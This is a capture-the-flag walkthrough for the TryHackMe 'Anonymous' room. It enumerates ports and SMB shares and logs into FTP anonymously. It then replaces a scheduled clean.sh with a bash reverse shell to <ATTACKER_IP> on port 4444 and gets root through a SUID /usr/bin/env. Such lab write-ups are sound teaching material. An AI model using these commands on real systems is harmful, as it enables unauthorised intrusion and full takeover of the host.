# [Anonymous](https://tryhackme.com/room/anonymous)

## Not the hacking group

# Pwn

### Enumerate the machine. How many ports are open?

1. There are **4** open ports

```bash
nmap -sV -p- <TARGET_IP>
```

[SCREEN01]

### What service is running on port 21?

1. **ftp** is running on port 21

### What service is running on ports 139 and 445?

1. The service is **smb**

### There's a share on the user's computer. What's it called?

1. Enumerate SMB shares using smbclient
   - The folder is **pics**

```bash
smbclient -L //<TARGET_IP> -N
```

### user.txt

_What's that log file doing there?... nc won't work the way you'd expect it to_

1. Access the FTP server using anonymous login and examine available files:

```bash
ftp <TARGET_IP>
anonymous
ls -la
cd script
ls -la
mget *
```

2. Examine the downloaded files locally. The `clean.sh` script appears to be executed periodically. Create a reverse shell payload

```bash
echo '#!/bin/bash' > clean.sh
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> clean.sh
```

3. Upload the modified script back to the FTP server

```bash
put clean.sh
```

4. Set up a netcat listener and wait for the scheduled execution. Once the reverse shell is established, locate the user flag

```bash
nc -lvnp 4444
cat user.txt
```

[SCREEN03]

### root.txt

_This may require you to do some outside research_

1. Search for SUID binaries that can be exploited for privilege escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

2. The `/usr/bin/env` binary has SUID permissions set. This can be exploited to spawn a root shell

```bash
/usr/bin/env /bin/sh -p
```

3. Verify root access and retrieve the root flag

```bash
whoami
cat /root/root.txt
```

[SCREEN04]
